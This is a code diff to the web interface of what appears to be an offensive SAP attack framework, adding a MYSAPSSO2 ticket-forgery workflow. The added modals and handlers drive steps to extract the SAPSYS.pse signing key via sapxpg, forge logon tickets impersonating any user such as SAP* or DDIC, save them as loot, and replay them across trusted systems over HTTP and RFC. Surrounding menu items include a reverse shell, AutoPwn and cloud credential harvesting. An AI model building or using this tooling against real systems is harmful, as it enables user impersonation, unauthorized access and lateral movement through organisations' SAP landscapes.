@@ -825,6 +825,11 @@ body {
       <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
       <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
       <div class="ctx-sep"></div>
+      <!-- MYSAPSSO2 ticket-forgery workflow -->
+      <div class="ctx-item" data-action="sso2_profile_check">&#128203; Check SSO2 Profile (accept/create params)</div>
+      <div class="ctx-item" data-action="forge_ticket">&#127915; Forge MYSAPSSO2 Ticket (impersonate any user)</div>
+      <div class="ctx-item" data-action="propagate_ticket">&#128640; Propagate Forged Ticket (HTTP+RFC across trust)</div>
+      <div class="ctx-sep"></div>
       <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
       <div class="ctx-item" data-action="harvest_btp_creds">&#9729; Harvest BTP Credentials (lateral to cloud)</div>
       <div class="ctx-item" data-action="verify_pp_impersonation">&#127919; Verify PP Impersonation (Live Probe)</div>
@@ -1683,6 +1688,118 @@ body {
     <div class="form-actions">
       <button class="btn" onclick="closeModal('autopwn-config-modal')">Cancel</button>
       <button class="btn btn-primary" onclick="launchAutoPwn()" style="background:#f85149;border-color:#f85149">&#9889; Start AutoPwn</button>
+    </div>
+  </div>
+</div>
+
+<!-- =====================================================
+     MYSAPSSO2 ticket-forgery modals
+     ===================================================== -->
+
+<!-- 1. Forge MYSAPSSO2 Ticket Modal -->
+<div class="modal-overlay" id="forge-ticket-modal">
+  <div class="modal" style="max-width:560px;width:95vw">
+    <h3>&#127915; Forge MYSAPSSO2 Logon Ticket</h3>
+    <div id="forge-ticket-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
+    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
+      Extracts <code>SAPSYS.pse</code> via sapxpg, decrypts the signing
+      key, and mints a ticket impersonating the chosen user.  The
+      ticket lands on this node's <code>forged_tickets</code> list and
+      is saved under <code>loot/tickets/&lt;SID&gt;_&lt;user&gt;_&lt;ts&gt;/</code>.
+    </div>
+    <div class="form-row">
+      <label>Impersonate user</label>
+      <input type="text" id="forge-ticket-user" placeholder="SAP*" style="width:140px">
+      <span style="font-size:10px;color:#484f58;margin-left:8px">e.g. SAP*, DDIC, JORIS</span>
+    </div>
+    <div class="form-row">
+      <label>Client</label>
+      <input type="text" id="forge-ticket-client" placeholder="100" style="width:80px">
+    </div>
+    <div class="form-row">
+      <label>Validity (min)</label>
+      <input type="number" id="forge-ticket-validity" placeholder="480" min="1" max="1440" style="width:80px">
+      <span style="font-size:10px;color:#484f58;margin-left:8px">SAP default: 480 (8h)</span>
+    </div>
+    <div class="form-row">
+      <label>Signature digest</label>
+      <select id="forge-ticket-digest" style="width:140px">
+        <option value="sha1">sha1 (DSA-signed PSE, older kernels)</option>
+        <option value="sha256" selected>sha256 (modern RSA/EC PSE)</option>
+      </select>
+    </div>
+    <details style="margin-top:10px">
+      <summary style="cursor:pointer;font-size:12px;color:#8b949e">Advanced (optional)</summary>
+      <div class="form-row" style="margin-top:8px">
+        <label>PIN override</label>
+        <input type="text" id="forge-ticket-pin" placeholder="(skip candidate walk)" style="width:200px">
+      </div>
+      <div class="form-row">
+        <label>Recipient SID</label>
+        <input type="text" id="forge-ticket-recipient-sid" placeholder="(STRUSTSSO2 pin)" style="width:100px">
+        <label style="margin-left:12px">client</label>
+        <input type="text" id="forge-ticket-recipient-client" placeholder="" style="width:80px">
+      </div>
+    </details>
+    <div class="form-actions">
+      <button class="btn" onclick="closeModal('forge-ticket-modal')">Cancel</button>
+      <button class="btn btn-primary" onclick="submitForgeTicket()">&#127915; Forge Ticket</button>
+    </div>
+  </div>
+</div>
+
+<!-- 2. SSO2 Profile Check Result Modal -->
+<div class="modal-overlay" id="sso2-check-modal">
+  <div class="modal" style="max-width:680px;width:95vw">
+    <h3>&#128203; SSO2 Profile Pre-flight Check</h3>
+    <div id="sso2-check-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
+    <div id="sso2-check-status" style="font-size:13px;font-weight:600;margin-bottom:8px"></div>
+    <div id="sso2-check-issues" style="font-size:12px;color:#c9d1d9;margin-bottom:12px;line-height:1.6"></div>
+    <table id="sso2-check-params-table" style="width:100%;font-size:12px;border-collapse:collapse">
+      <thead>
+        <tr style="background:#161b22"><th style="text-align:left;padding:6px;border-bottom:1px solid #30363d">Profile parameter</th><th style="text-align:left;padding:6px;border-bottom:1px solid #30363d">Value</th><th style="text-align:left;padding:6px;border-bottom:1px solid #30363d">Meaning</th></tr>
+      </thead>
+      <tbody id="sso2-check-params-body"></tbody>
+    </table>
+    <div id="sso2-check-profiles" style="font-size:11px;color:#484f58;margin-top:10px;line-height:1.5"></div>
+    <div class="form-actions">
+      <button class="btn" onclick="closeModal('sso2-check-modal')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- 3. Propagate Forged Ticket Modal -->
+<div class="modal-overlay" id="propagate-ticket-modal">
+  <div class="modal" style="max-width:580px;width:95vw">
+    <h3>&#128640; Propagate Forged MYSAPSSO2 Ticket</h3>
+    <div id="propagate-ticket-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
+    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
+      Replays a previously forged ticket against STRUSTSSO2-trusted
+      receivers using HTTP cookie + RFC channels.  Receivers are the
+      SIDs you trust have the issuing system's cert in their
+      <code>TWPSSO2ACL</code>.
+    </div>
+    <div class="form-row">
+      <label>Ticket</label>
+      <select id="propagate-ticket-select" style="width:340px"></select>
+    </div>
+    <div class="form-row">
+      <label>Target SIDs</label>
+      <input type="text" id="propagate-ticket-targets" placeholder="S4H,S4D,SOLMAN" style="width:340px">
+      <span style="font-size:10px;color:#484f58;margin-left:6px">comma-separated</span>
+    </div>
+    <div class="form-row">
+      <label>Channels</label>
+      <label style="font-weight:normal"><input type="checkbox" id="propagate-ticket-http" checked> HTTP cookie</label>
+      <label style="font-weight:normal;margin-left:12px"><input type="checkbox" id="propagate-ticket-rfc" checked> RFC (pyrfc)</label>
+    </div>
+    <div class="form-row">
+      <label>Timeout (s)</label>
+      <input type="number" id="propagate-ticket-timeout" value="10" min="1" max="120" style="width:80px">
+    </div>
+    <div class="form-actions">
+      <button class="btn" onclick="closeModal('propagate-ticket-modal')">Cancel</button>
+      <button class="btn btn-primary" onclick="submitPropagateTicket()">&#128640; Propagate</button>
     </div>
   </div>
 </div>
@@ -4908,6 +5025,16 @@ async function ctxAction(action) {
         updateMap();
       }
       break;
+    // ── MYSAPSSO2 ticket-forgery workflow ───────────────────────────
+    case 'forge_ticket':
+      showForgeTicketModal(sid);
+      break;
+    case 'sso2_profile_check':
+      runSso2ProfileCheck(sid);
+      break;
+    case 'propagate_ticket':
+      showPropagateTicketModal(sid);
+      break;
   }
   startPolling();
 }
@@ -5340,6 +5467,45 @@ function showDetails(sid) {
       <h4>Created Users (${(n.created_users||[]).length})</h4>
       ${(n.created_users || []).map(u => `<div class="detail-row"><span class="detail-key">${escHtml(u.username)}</span><span class="detail-val">Client ${escHtml(u.client)} via ${escHtml(u.method)}</span></div>`).join('') || '<div style="color:#484f58">None</div>'}
     </div>
+    ${(() => {
+      // ── Forged MYSAPSSO2 Tickets ────────────────────────────
+      // One row per ticket: shows user@SID/client, signer DN
+      // (CN extracted from the full DN string for compactness),
+      // validity countdown (red when expired), and used_on count.
+      // Validity is computed client-side from forged_at +
+      // validity_min so it ticks down in real time across polls.
+      const ts = n.forged_tickets || [];
+      if (ts.length === 0) return '';
+      const now = Date.now() / 1000;
+      const rows = ts.map((t, idx) => {
+        const issued = t.forged_at ? Date.parse(t.forged_at)/1000 : 0;
+        const validMin = t.validity_min || 0;
+        const expiresAt = issued + validMin * 60;
+        const remainingMin = (expiresAt - now) / 60;
+        const expired = remainingMin <= 0;
+        const ttlText = expired
+          ? '<span style="color:#f85149">expired</span>'
+          : `<span style="color:#3fb950">${Math.round(remainingMin)}m left</span>`;
+        // Compact signer: prefer the CN= component if present
+        const dnFull = t.signer_dn || '';
+        const cnMatch = dnFull.match(/CN=([^,]+)/i);
+        const signer = cnMatch ? cnMatch[1] : (dnFull.slice(0, 20) || '?');
+        const usedCount = (t.used_on || []).length;
+        return '<div class="detail-row" style="font-size:11px">'
+          + `<span class="detail-key">#${idx} ${escHtml(t.user || '?')}@`
+          + `${escHtml(t.sid || '?')}/${escHtml(t.client || '?')}</span>`
+          + `<span class="detail-val">`
+          + ttlText
+          + ` &middot; signer ${escHtml(signer)}`
+          + (usedCount > 0
+              ? ` &middot; used ${usedCount}&times;` : '')
+          + `</span></div>`;
+      }).join('');
+      return '<div class="detail-section">'
+        + `<h4>&#127915; Forged MYSAPSSO2 Tickets (${ts.length})</h4>`
+        + rows
+        + '</div>';
+    })()}
     ${(() => {
       const ss = n.secstore_entries || [];
       if (ss.length === 0) return '';
@@ -6882,6 +7048,286 @@ function showSaprouterModal(sid) {
   document.getElementById('saprouter-input').value = (n && n.saprouter) || '';
   document.getElementById('saprouter-modal').classList.add('visible');
   document.getElementById('saprouter-input').focus();
+}
+
+// =====================================================================
+//  MYSAPSSO2 ticket-forgery workflow — UI handlers
+// =====================================================================
+//
+// Three operator actions, each anchored to a node in the map:
+//
+//   1. showForgeTicketModal(sid)     — opens the forge modal, then
+//      POSTs to /api/node/<sid>/forge_ticket on Submit.  The forge
+//      runs as a background job; the new ticket appears on
+//      node.forged_tickets via the regular state poll.
+//
+//   2. runSso2ProfileCheck(sid)      — fires-and-shows: POSTs to
+//      /api/node/<sid>/sso2_profile_check (synchronous), then
+//      renders the structured result in the sso2-check-modal.
+//
+//   3. showPropagateTicketModal(sid) — opens the propagate modal,
+//      pre-populates the ticket selector from node.forged_tickets,
+//      then POSTs to /api/node/<sid>/propagate_ticket on Submit.
+//
+// All three are gated on a node existing in mapState; the forge
+// modal also needs the node to have OS access (sapxpg/10KBLAZE)
+// because the chain reads SAPSYS.pse from disk.
+// ---------------------------------------------------------------------
+
+function showForgeTicketModal(sid) {
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+
+  // Header line — show what we know about the system + any tickets
+  // already forged for it, so the operator can avoid duplicates.
+  let info = `<strong>${escHtml(n.sid)}</strong> `
+           + `(${escHtml(n.hostname || n.ip)})`;
+  const tickets = n.forged_tickets || [];
+  if (tickets.length > 0) {
+    info += `<div style="margin-top:6px;font-size:11px;color:#8b949e">`
+          + `Existing forged tickets on this node: ${tickets.length}`
+          + `</div>`;
+  }
+  document.getElementById('forge-ticket-system-info').innerHTML = info;
+
+  // Sensible defaults that match the operator-guide examples
+  const firstClient = (n.clients && n.clients[0] && n.clients[0].nr)
+                       || '100';
+  document.getElementById('forge-ticket-user').value = 'SAP*';
+  document.getElementById('forge-ticket-client').value = firstClient;
+  document.getElementById('forge-ticket-validity').value = 480;
+  document.getElementById('forge-ticket-digest').value = 'sha256';
+  document.getElementById('forge-ticket-pin').value = '';
+  document.getElementById('forge-ticket-recipient-sid').value = '';
+  document.getElementById('forge-ticket-recipient-client').value = '';
+
+  document.getElementById('forge-ticket-modal').classList.add('visible');
+}
+
+async function submitForgeTicket() {
+  const sid = selectedNodeSid;
+  if (!sid) return;
+
+  const body = {
+    user: document.getElementById('forge-ticket-user').value || 'SAP*',
+    client: document.getElementById('forge-ticket-client').value || '100',
+    validity_min: parseInt(
+      document.getElementById('forge-ticket-validity').value) || 480,
+    digest: document.getElementById('forge-ticket-digest').value || 'sha256',
+  };
+  // Only send advanced fields when populated, so the backend uses
+  // its own defaults / candidate-walk where appropriate.
+  const pin = document.getElementById('forge-ticket-pin').value;
+  if (pin) body.pin = pin;
+  const rsid = document.getElementById('forge-ticket-recipient-sid').value;
+  if (rsid) body.recipient_sid = rsid;
+  const rcli = document.getElementById('forge-ticket-recipient-client').value;
+  if (rcli) body.recipient_client = rcli;
+
+  closeModal('forge-ticket-modal');
+  showToast(
+    `&#127915; Forging MYSAPSSO2 ticket for ${escHtml(body.user)}`
+    + `@${escHtml(sid)}/${escHtml(body.client)} — see console for `
+    + `per-step progress; ticket will appear on the node when done.`,
+    'info'
+  );
+  await api('POST', `node/${sid}/forge_ticket`, body);
+  // Bring polling back to life so the new ticket shows up promptly
+  // in the node details / sidebar.
+  startPolling();
+}
+
+async function runSso2ProfileCheck(sid) {
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+
+  // Show a loading state immediately — the check is fast (a few
+  // small file reads) but the gateway round-trips still take a
+  // second or two, so the operator needs feedback.
+  document.getElementById('sso2-check-system-info').innerHTML =
+    `<strong>${escHtml(n.sid)}</strong> `
+    + `(${escHtml(n.hostname || n.ip)})`;
+  document.getElementById('sso2-check-status').textContent =
+    'Reading /usr/sap/' + n.sid + '/SYS/profile/ ...';
+  document.getElementById('sso2-check-status').style.color = '#8b949e';
+  document.getElementById('sso2-check-issues').innerHTML = '';
+  document.getElementById('sso2-check-params-body').innerHTML = '';
+  document.getElementById('sso2-check-profiles').innerHTML = '';
+  document.getElementById('sso2-check-modal').classList.add('visible');
+
+  let res;
+  try {
+    res = await api('POST', `node/${sid}/sso2_profile_check`);
+  } catch (e) {
+    document.getElementById('sso2-check-status').textContent =
+      'FAILED: ' + (e && e.message || e);
+    document.getElementById('sso2-check-status').style.color = '#f85149';
+    return;
+  }
+
+  if (res && res.error) {
+    document.getElementById('sso2-check-status').textContent =
+      'FAILED: ' + res.error;
+    document.getElementById('sso2-check-status').style.color = '#f85149';
+    return;
+  }
+
+  // ── Status banner (green OK / red blocker) ─────────────────────
+  const ok = !!res.ok;
+  const status = document.getElementById('sso2-check-status');
+  status.textContent = ok
+    ? '✅ OK — node accepts SSO2 tickets in our forger\'s format'
+    : '❌ BLOCKER — forged tickets will be rejected';
+  status.style.color = ok ? '#3fb950' : '#f85149';
+
+  // ── Issues list (errors first, then warnings) ──────────────────
+  const issues = document.getElementById('sso2-check-issues');
+  let html = '';
+  for (const err of (res.errors || [])) {
+    html += `<div style="color:#f85149">[−] ${escHtml(err)}</div>`;
+  }
+  for (const warn of (res.warnings || [])) {
+    html += `<div style="color:#d29922">[?] ${escHtml(warn)}</div>`;
+  }
+  if (res.recommend_include_cert !== null
+      && res.recommend_include_cert !== undefined) {
+    html += `<div style="color:#58a6ff;margin-top:4px">`
+          + `[i] recommended <code>include_cert=`
+          + `${res.recommend_include_cert ? 'True' : 'False'}</code>`
+          + `</div>`;
+  }
+  issues.innerHTML = html;
+
+  // ── Param value table ──────────────────────────────────────────
+  const meanings = {
+    'login/accept_sso2_ticket': {
+      '0': 'Disabled — kernel rejects all SSO2 cookies',
+      '1': 'Enabled — kernel validates via TWPSSO2ACL',
+    },
+    'login/create_sso2_ticket': {
+      '0': "Don't create",
+      '1': 'Create with embedded cert',
+      '2': 'Create without embedded cert',
+      '3': 'Assertion tickets only',
+    },
+    'login/sso2_ticket_strict_owner_check': {
+      '0': 'Lenient (any TWPSSO2ACL issuer accepted)',
+      '1': 'Strict (Owner DN must match exactly)',
+    },
+  };
+  let rows = '';
+  const observed = res.observed || {};
+  for (const k of Object.keys(meanings)) {
+    const v = observed[k];
+    const m = (meanings[k][v] !== undefined)
+              ? meanings[k][v]
+              : (v === undefined ? '(not in profile)' : '(unknown value)');
+    const valColor = (k === 'login/accept_sso2_ticket' && v !== '1')
+                     ? '#f85149' : '#c9d1d9';
+    rows += `<tr>`
+          + `<td style="padding:6px;border-bottom:1px solid #21262d;font-family:monospace">${escHtml(k)}</td>`
+          + `<td style="padding:6px;border-bottom:1px solid #21262d;color:${valColor};font-family:monospace">${escHtml(v === undefined ? '—' : v)}</td>`
+          + `<td style="padding:6px;border-bottom:1px solid #21262d">${escHtml(m)}</td>`
+          + `</tr>`;
+  }
+  document.getElementById('sso2-check-params-body').innerHTML = rows;
+
+  // ── Profile-file provenance ────────────────────────────────────
+  let prov = '';
+  for (const p of (res.profiles_read || [])) {
+    prov += `<div>[r] ${escHtml(p)}</div>`;
+  }
+  for (const f of (res.profiles_failed || [])) {
+    prov += `<div style="color:#f85149">[−] ${escHtml(f.path)} `
+          + `(${escHtml(f.error || 'failed')})</div>`;
+  }
+  document.getElementById('sso2-check-profiles').innerHTML = prov;
+}
+
+function showPropagateTicketModal(sid) {
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+
+  const tickets = n.forged_tickets || [];
+  if (tickets.length === 0) {
+    showToast(
+      `${escHtml(sid)} has no forged tickets yet — forge one `
+      + `first via the &#127915; Forge MYSAPSSO2 Ticket action.`,
+      'warn'
+    );
+    return;
+  }
+
+  // Header line + summary
+  document.getElementById('propagate-ticket-system-info').innerHTML =
+    `<strong>${escHtml(n.sid)}</strong> `
+    + `(${escHtml(n.hostname || n.ip)}) — `
+    + `${tickets.length} ticket(s) on disk`;
+
+  // Populate the ticket selector with one option per forged ticket.
+  // Label format: "0: JORIS@S4H/001 — 23m left, signer CN=S4H"
+  const sel = document.getElementById('propagate-ticket-select');
+  sel.innerHTML = '';
+  tickets.forEach((t, idx) => {
+    const remaining = (t.remaining_minutes !== undefined
+                        && t.remaining_minutes !== null)
+                      ? Math.round(t.remaining_minutes) + 'm left'
+                      : 'unknown TTL';
+    const signer = t.signer_dn || '?';
+    const label = `${idx}: ${t.user || '?'}@${t.sid || '?'}/`
+                + `${t.client || '?'} — ${remaining}, `
+                + `signer ${signer}`;
+    const opt = document.createElement('option');
+    opt.value = String(idx);
+    opt.textContent = label;
+    sel.appendChild(opt);
+  });
+
+  // Default target SIDs: the issuer itself (self-trust) — operator
+  // can extend with comma-separated SIDs of receivers they know
+  // have us in their TWPSSO2ACL.
+  document.getElementById('propagate-ticket-targets').value = sid;
+  document.getElementById('propagate-ticket-http').checked = true;
+  document.getElementById('propagate-ticket-rfc').checked = true;
+  document.getElementById('propagate-ticket-timeout').value = 10;
+
+  document.getElementById('propagate-ticket-modal').classList.add('visible');
+}
+
+async function submitPropagateTicket() {
+  const sid = selectedNodeSid;
+  if (!sid) return;
+
+  const targets = document.getElementById('propagate-ticket-targets')
+                    .value.split(',').map(s => s.trim()).filter(Boolean);
+  const channels = [];
+  if (document.getElementById('propagate-ticket-http').checked)
+    channels.push('http');
+  if (document.getElementById('propagate-ticket-rfc').checked)
+    channels.push('rfc');
+  if (channels.length === 0) {
+    showToast('Pick at least one channel (HTTP or RFC)', 'warn');
+    return;
+  }
+
+  const body = {
+    ticket_index: parseInt(
+      document.getElementById('propagate-ticket-select').value) || 0,
+    target_sids: targets,
+    channels: channels,
+    timeout: parseInt(
+      document.getElementById('propagate-ticket-timeout').value) || 10,
+  };
+
+  closeModal('propagate-ticket-modal');
+  showToast(
+    `&#128640; Propagating ticket #${body.ticket_index} to `
+    + `${escHtml(targets.join(', '))} via ${channels.join('+')} `
+    + `— see console for per-receiver verdicts.`,
+    'info'
+  );
+  await api('POST', `node/${sid}/propagate_ticket`, body);
+  startPolling();
 }
 
 function showRouterScanModal(sid) {
